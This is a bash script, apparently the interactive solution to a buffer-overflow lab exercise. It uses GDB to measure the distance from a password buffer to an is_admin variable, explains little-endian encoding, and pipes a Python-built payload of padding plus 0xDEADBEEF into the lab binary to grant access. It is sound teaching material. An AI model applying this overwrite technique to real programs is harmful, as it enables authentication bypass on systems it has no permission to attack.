#!/usr/bin/env bash
#
# Interactive solution for exercise 2.  This script compiles the target,
# uses GDB to compute the offset between the password buffer and the
# `is_admin` variable, explains little‑endian encoding, and builds an
# exploit that writes `0xDEADBEEF` into `is_admin`.  The payload is
# constructed with Python and piped into the program.

set -euo pipefail
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"

echo "=== Exercise 2: Buffer overflow, but cooler ==="
echo "Our goal is to set is_admin to the magic value 0xDEADBEEF by"
echo "overflowing the password buffer.  Because the CPU is little‑endian we"
echo "need to write the constant in reverse byte order.  GDB will tell us"
echo "how many bytes of padding are required."

cd "$DIR/../lab2"

read -rp "Press ENTER to build ex2..."
make ex2

read -rp "Press ENTER to launch gdb and compute the offset..."

TMP=$(mktemp)

gdb -q \
  -ex "file ./bin/ex2" \
  -ex "break main" \
  -ex "run" \
  -ex "frame 0" \
  -ex "# step over prologue" \
  -ex "nexti 2" \
  -ex "printf \"&password = %p\\n\", &password" \
  -ex "printf \"&is_admin = %p\\n\", &is_admin" \
  -ex "quit" \
  2>&1 | tee "$TMP"

pwd_hex=$(grep "&password" "$TMP" | awk '{print $3}')
adm_hex=$(grep "&is_admin" "$TMP" | awk '{print $3}')

if [[ -z "$pwd_hex" || -z "$adm_hex" ]]; then
  echo "[!] Failed to parse addresses from GDB output"
  exit 1
fi

OFFSET=$(python3 -c "buf=int('$pwd_hex',0); adm=int('$adm_hex',0); print(adm-buf)")

echo "[INFO] &password = $pwd_hex"
echo "[INFO] &is_admin = $adm_hex"
echo "Offset from password to is_admin: $OFFSET bytes"

echo "Little‑endian means the least significant byte comes first.  For"
echo "0xDEADBEEF the byte sequence is EF BE AD DE.  We will write eight"
echo "bytes (four for the constant and four zeros) to fill the 64‑bit long."

read -rp "Press ENTER to send the crafted payload..."

python3 -c "import sys; sys.stdout.buffer.write(b'A'*$OFFSET + (0xDEADBEEF).to_bytes(8, 'little'))" | ./bin/ex2

echo "If you see 'Access granted!', the overflow succeeded."
echo
echo "For an automated version using pwntools run: python3 solve_ex2.py"